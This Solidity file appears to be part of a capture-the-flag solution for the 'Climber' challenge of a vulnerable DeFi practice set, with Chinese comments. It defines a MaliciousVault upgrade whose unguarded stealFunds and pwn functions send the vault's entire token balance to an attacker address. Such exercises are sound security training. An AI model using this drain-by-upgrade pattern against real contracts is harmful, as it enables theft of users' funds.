import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock} from "../../src/climber/ClimberTimelock.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// 在测试文件内部或单独文件中定义
contract MaliciousVault is ClimberVault {
    // 保存要转移代币的目标地址
    address public attacker;
    bool public upgraded;
    constructor() {
        _disableInitializers(); // 与UUPS可升级合约模式保持一致
    }
    // 一个初始化函数，用于设置攻击者地址
    function initializeV2(address _attacker) public reinitializer(2) {
        attacker = _attacker;
    }
    // 重写 sweepFunds 或其他函数，使其在升级后将代币转给攻击者
    // 或者，可以利用升级后的 `_authorizeUpgrade` 逻辑漏洞
    // 更简单的方式：在升级后的逻辑中直接提取代币
    function stealFunds(address token) public {
        // 例如，允许任何人调用，或将代币转给 attacker
        IERC20(token).transfer(attacker, IERC20(token).balanceOf(address(this)));
    }
    // 为了通过时间锁的 execute 调用，您需要一个函数来触发这个恶意行为
    function pwn(address token) external {
        require(msg.sender == attacker || msg.sender == address(this)); // 简单的权限控制
        stealFunds(token);
    }
}